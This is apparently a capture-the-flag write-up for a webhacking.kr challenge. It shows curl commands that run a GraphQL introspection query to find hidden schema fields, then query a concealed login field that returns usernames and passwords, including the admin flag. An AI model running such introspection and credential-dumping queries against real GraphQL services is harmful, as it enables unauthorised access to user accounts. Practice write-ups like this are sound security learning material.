# NotSQL

URL: [http://webhacking.kr:10012/](http://webhacking.kr:10012/)

From the look of it we are dealing with SQLi, but when we try different payloads nothing happens.

![notsql.png](/assets/ctf/webhacking.kr/notsql.png)

Inspecting the source we can see that it in fact is not an SQL, but GraphQL

```html
<h2>Board</h2>
<hr>
<div id="board"></div>
<script>
  function getQueryVar(variable) {
    var query = window.location.search.substring(1);
    var vars = query.split('&');
    for (var i = 0; i < vars.length; i++) {
      var pair = vars[i].split('=');
      if (decodeURIComponent(pair[0]) == variable) {
        return decodeURIComponent(pair[1]);
      }
    }
  }
  if (!getQueryVar("no")) {
    q = `query{
    view{
      no,
      subject
    }
  }`;
    xhr = new XMLHttpRequest();
    xhr.open("GET", "/view.php?query=" + JSON.stringify(q).slice(1).slice(0, -1), false);
    xhr.send();
    res = JSON.parse(xhr.response);
    for (i = 0; i < res.data.view.length; i++) {
      board.innerHTML += `<a href=/?no=${res.data.view[i].no}>${res.data.view[i].subject}</a><br>`;
    }
  } else {
    q = `query{
    view{
      no,
      subject,
      content
    }
  }`;
    xhr = new XMLHttpRequest();
    xhr.open("GET", "/view.php?query=" + JSON.stringify(q).slice(1).slice(0, -1), false);
    xhr.send();
    res = JSON.parse(xhr.response);
    v = res.data.view;
    try {
      parsed = v.find(v => v.no == getQueryVar("no"));
      board.innerHTML = `<h2>${parsed.subject}</h2><br><br>${parsed.content}`;
    } catch {
      board.innerHTML = `<h2>???</h2><br><br>404 Not Found.`;
    }
  }
</script>
```

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql)

Perform **Introspection** via `{__schema{types{name,fields{name}}}}` query:

```bash
└─$ curl -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' 'http://webhacking.kr:10012/view.php?query=%7B__schema%7Btypes%7Bname%2Cfields%7Bname%7D%7D%7D%7D' -s | jq
{
  "data": {
    "__schema": {
      "types": [
        {
          "name": "Board",
          "fields": [
            {
              "name": "no"
            },
            {
              "name": "subject"
            },
            {
              "name": "content"
            }
          ]
        },
        {
          "name": "Int",
          "fields": null
        },
        {
          "name": "String",
          "fields": null
        },
        {
          "name": "User_d51e7f78cbb219316e0b7cfe1a64540a",
          "fields": [
            {
              "name": "userid_a7fce99fa52d173843130a9620a787ce"
            },
            {
              "name": "passwd_e31db968948082b92e60411dd15a25cd"
            }
          ]
        },
        {
          "name": "Query",
          "fields": [
            {
              "name": "view"
            },
            {
              "name": "login_51b48f6f7e6947fba0a88a7147d54152"
            }
          ]
        },
        {
          "name": "CacheControlScope",
          "fields": null
        },
        {
          "name": "Upload",
          "fields": null
        },
        {
          "name": "Boolean",
          "fields": null
        },
        {
          "name": "__Schema",
          "fields": [
            {
              "name": "description"
            },
            {
              "name": "types"
            },
            {
              "name": "queryType"
            },
            {
              "name": "mutationType"
            },
            {
              "name": "subscriptionType"
            },
            {
              "name": "directives"
            }
          ]
        },
        {
          "name": "__Type",
          "fields": [
            {
              "name": "kind"
            },
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "specifiedByUrl"
            },
            {
              "name": "fields"
            },
            {
              "name": "interfaces"
            },
            {
              "name": "possibleTypes"
            },
            {
              "name": "enumValues"
            },
            {
              "name": "inputFields"
            },
            {
              "name": "ofType"
            }
          ]
        },
        {
          "name": "__TypeKind",
          "fields": null
        },
        {
          "name": "__Field",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "args"
            },
            {
              "name": "type"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__InputValue",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "type"
            },
            {
              "name": "defaultValue"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__EnumValue",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "isDeprecated"
            },
            {
              "name": "deprecationReason"
            }
          ]
        },
        {
          "name": "__Directive",
          "fields": [
            {
              "name": "name"
            },
            {
              "name": "description"
            },
            {
              "name": "isRepeatable"
            },
            {
              "name": "locations"
            },
            {
              "name": "args"
            }
          ]
        },
        {
          "name": "__DirectiveLocation",
          "fields": null
        }
      ]
    }
  }
}
```

Get the other table which exists in GraphQL: `{login_51b48f6f7e6947fba0a88a7147d54152{userid_a7fce99fa52d173843130a9620a787ce, passwd_e31db968948082b92e60411dd15a25cd}}`

```bash
└─$ curl -b 'PHPSESSID=hi4uvai5sde90encr0ktq6879f' 'http://webhacking.kr:10012/view.php?query=%7Blogin_51b48f6f7e6947fba0a88a7147d54152%7Buserid_a7fce99fa52d173843130a9620a787ce%2C%20passwd_e31db968948082b92e60411dd15a25cd%7D%7D' -s | jq
{
  "data": {
    "login_51b48f6f7e6947fba0a88a7147d54152": [
      {
        "userid_a7fce99fa52d173843130a9620a787ce": "test-user",
        "passwd_e31db968948082b92e60411dd15a25cd": "test-password"
      },
      {
        "userid_a7fce99fa52d173843130a9620a787ce": "admin",
        "passwd_e31db968948082b92e60411dd15a25cd": "FLAG{i_know_how_to_use_graphql}"
      }
    ]
  }
}
```